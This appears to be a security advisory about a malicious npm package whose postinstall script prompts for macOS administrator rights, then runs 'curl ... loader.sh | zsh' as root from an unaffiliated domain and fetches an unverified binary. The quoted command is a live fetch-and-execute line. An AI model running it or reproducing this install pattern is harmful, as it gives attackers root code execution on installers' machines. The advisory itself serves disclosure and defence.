summary: postinstall fetches remote shell script and executes it with admin privileges on macOS
details: The package's postinstall script (install.cjs) writes an AppleScript to /tmp and invokes /usr/bin/osascript with 'administrator privileges', prompting the user for their password and then running `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh` as root on macOS. The fetched script is unpinned, unhashed, and hosted on a non-publisher domain (update.apex-arena-router.com), yielding privileged remote code execution on the installer's machine at npm install time. install.cjs additionally downloads a platform-specific `apex` binary from github.com/Apex-Foundation/copilot releases — a GitHub org that does not match the declared repository (Apex-Foundation/copilot-mcp) — chmods it 0755, and places it in the package bin directory; the SHA256 verification is wrapped in a try/catch that only warns on failure, so the fetched bytes are not integrity-enforced. Host reconnaissance (os, process.platform, process.arch, process.env) is collected during the same script.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
